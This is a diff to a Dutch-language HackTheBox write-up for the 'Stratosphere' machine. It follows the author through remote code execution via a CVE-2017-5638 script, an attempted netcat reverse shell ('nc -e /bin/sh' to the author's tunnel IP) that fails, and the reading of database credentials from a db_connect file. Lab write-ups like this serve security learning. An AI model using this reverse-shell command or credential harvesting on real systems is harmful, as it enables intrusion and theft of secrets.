@@ -35,4 +35,8 @@ Dit is een Python script dat CVE-2017-5638 probeert te exploiteren.
 
 <img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/4.PNG" />
 
-Hoppa, remote code execution! Het is nu de bedoeling dat ik een shell krijg, en dat is niet zo moeilijk. In plaats van ```echo "Gio" ``` als commando te gebruiken gebruik ik een commando waarmee ik dus een shell kan krijgen. De commando die ik meestal gebruik is: ```nc -e /bin/sh [Mijn tunnel ip] 1234 ```
+Hoppa, remote code execution! Het is nu de bedoeling dat ik een shell krijg, en dat is niet zo moeilijk. In plaats van ```echo "Gio" ``` als commando te gebruiken gebruik ik een commando waarmee ik dus een shell kan krijgen. De commando die ik meestal gebruik is: ```nc -e /bin/sh [Mijn tunnel ip] 1234 ```. Maar dit werkt niet, sterker nog geen één reverse shell commando werkt, dit kom waarschijnlijk omdat de script niet kan blijven hangen maar een error gooit. 
+
+Ongeveer 2 uur later is mijn irritatie grens bereikt en probeer ik te kijken of er misschien andere interesante dingen zijn. Het eerste wat ik dan doe is kijken of de webserver database credentials lekt en met deze proberen in te loggen. Ik zie (via het Python script) dat er een ``db_connect`` bestaat, en deze bevatten de database credentials :).
+
+<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/5.PNG" />
